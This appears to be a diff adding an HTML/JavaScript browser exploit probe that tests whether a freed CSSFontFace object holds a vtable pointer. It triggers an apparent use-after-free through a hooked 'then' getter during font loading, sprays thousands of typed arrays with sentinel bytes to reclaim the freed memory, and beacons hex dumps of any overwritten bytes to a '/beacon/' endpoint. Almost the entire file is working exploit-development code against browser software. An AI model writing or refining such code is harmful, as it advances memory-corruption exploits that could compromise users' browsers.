@@ -1,0 +1,126 @@
+<!--
+  p567: CSSFontFace vptr detection — does +0x00 hold a vtable pointer?
+
+  If CSSFontFace has virtual methods, bytes +0x00..+0x07 are a vptr
+  and ALL field offsets shift by 8 (T at struct+0x60, not +0x58, etc).
+
+  Method: fill first 32 bytes with per-dword sentinels, keep safety
+  fields.  After engine access, dump all 32 bytes and compare.
+
+  Sentinel layout:
+    +0x00: 02 00 00 00  (rc=2, safety)
+    +0x04: AA AA AA AA  (sentinel — untouched if no vptr)
+    +0x08: 02 00 00 00  (alt-rc=2, safe if vptr model correct)
+    +0x0C: BB BB BB BB  (sentinel)
+    +0x10: CC CC CC CC  (sentinel)
+    +0x14: DD DD DD DD  (sentinel)
+    +0x18: 11 11 11 11  (sentinel)
+    +0x1C: 22 22 22 22  (sentinel)
+
+  Verdict:
+    DW+0x00 changed, +0x04 intact, +0x08 intact → NO_VPTR
+    +0x04 changed (8-byte write at +0x00)           → VPTR_CANDIDATE
+    +0x08 changed (rc at +0x08)                     → RC_AT_0x08
+    Both +0x04 and +0x08 changed                    → VPTR_STRONG
+
+  CRASH_CLASS: HIGH
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p</title>
+<style id="v">@font-face{font-family:sa;src:local(Arial);unicode-range:U+0042}</style>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m,false);x.send();}catch(e){}}
+function rD(v,o){return(v[o]|0)+((v[o+1]|0)<<8)+((v[o+2]|0)<<16)+((v[o+3]|0)*0x1000000);}
+function rQ(v,o){var s='';for(var j=7;j>=0;j--)s+=('0'+v[o+j].toString(16)).slice(-2);return s;}
+function wD(v,o,x){v[o]=x&0xFF;v[o+1]=(x>>>8)&0xFF;v[o+2]=(x>>>16)&0xFF;v[o+3]=(x>>>24)&0xFF;}
+
+function main(){
+b('G');
+var pa=new FontFace('pa','local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(pa);void pa.loaded;
+var fired=0;
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+get:function(){if(fired)return;fired=1;
+document.getElementById('v').remove();
+try{document.fonts.delete(this);}catch(e){}
+document.body.offsetHeight;
+b('F');
+var lane=[];
+for(var i=0;i<2048;i++){
+  var u=new Uint8Array(new ArrayBuffer(192));
+  wD(u,0x00,2);            // rc=2
+  wD(u,0x04,0xAAAAAAAA);   // sentinel high-half QW0
+  wD(u,0x08,2);            // alt-rc=2 (safe if vptr model)
+  wD(u,0x0C,0xBBBBBBBB);   // sentinel
+  wD(u,0x10,0xCCCCCCCC);   // sentinel
+  wD(u,0x14,0xDDDDDDDD);   // sentinel
+  wD(u,0x18,0x11111111);   // sentinel
+  wD(u,0x1C,0x22222222);   // sentinel
+  // safety fields
+  wD(u,0x60,0);            // keyCount=0
+  wD(u,0x64,0xFFFFFFFF);   // maxOp
+  u[0x82]=3;               // status=3
+  lane.push(u);
+}
+b('S'+lane.length);
+window._l=lane;
+return;},set:function(){}});
+
+document.fonts.load('1em pa, sa','AB').then(function(){},function(){});
+
+setTimeout(function(){
+  var lane=window._l;if(!lane)return;
+  var hi=-1;
+  for(var i=0;i<lane.length;i++){
+    var v=lane[i];
+    var rc0=rD(v,0);
+    var t0=v[0x58]|v[0x59]|v[0x5A]|v[0x5B]|v[0x5C]|v[0x5D]|v[0x5E]|v[0x5F];
+    var b4=(v[4]===0xAA&&v[5]===0xAA&&v[6]===0xAA&&v[7]===0xAA);
+    // Hit = rc changed OR T non-zero OR sentinel at +0x04 changed
+    if(rc0!==2||t0||!b4){hi=i;break;}
+  }
+  if(hi<0){b('MISS');return;}
+
+  var v=lane[hi];
+  b('H'+hi);
+
+  // Full hex dump: first 32 bytes
+  var h0='';for(var j=0;j<16;j++)h0+=('0'+v[j].toString(16)).slice(-2);
+  var h1='';for(var j=16;j<32;j++)h1+=('0'+v[j].toString(16)).slice(-2);
+  b('B0:'+h0);
+  b('B1:'+h1);
+
+  // Key dwords
+  var dw00=rD(v,0x00);
+  var dw08=rD(v,0x08);
+  b('DW00='+dw00+',DW08='+dw08);
+
+  // Full qwords at 0x00 and 0x08
+  b('QW0='+rQ(v,0x00)+',QW1='+rQ(v,0x08));
+
+  // Byte-level sentinel checks
+  var s04=(v[4]===0xAA&&v[5]===0xAA&&v[6]===0xAA&&v[7]===0xAA);
+  var s08=(v[8]===0x02&&v[9]===0x00&&v[10]===0x00&&v[11]===0x00);
+  var s0c=(v[0x0C]===0xBB&&v[0x0D]===0xBB&&v[0x0E]===0xBB&&v[0x0F]===0xBB);
+  var s10=(v[0x10]===0xCC&&v[0x11]===0xCC&&v[0x12]===0xCC&&v[0x13]===0xCC);
+  b('S04='+(s04?'ok':'CHANGED')+',S08='+(s08?'ok':'CHANGED')+',S0C='+(s0c?'ok':'CHANGED')+',S10='+(s10?'ok':'CHANGED'));
+
+  // T, W, keyCount for reference
+  b('T='+rQ(v,0x58)+',W='+rQ(v,0x68)+',KC='+rD(v,0x60));
+
+  // Verdict
+  var dw00_changed=(dw00!==2);
+  var verdict;
+  if(dw00_changed&&s04&&s08)       verdict='NO_VPTR';
+  else if(!s04&&!s08)              verdict='VPTR_STRONG';
+  else if(!s04)                    verdict='VPTR_CANDIDATE';
+  else if(!s08&&s04)               verdict='RC_AT_0x08';
+  else if(!dw00_changed&&s04&&s08) verdict='NO_WRITE_AT_0';
+  else                             verdict='AMBIGUOUS';
+  b('VERDICT='+verdict);
+
+  setTimeout(function(){b('ALIVE');},500);
+  setTimeout(function(){b('ALIVE2');},2000);
+},80);
+}
+setTimeout(main,0);
+</script></head><body>p</body></html>
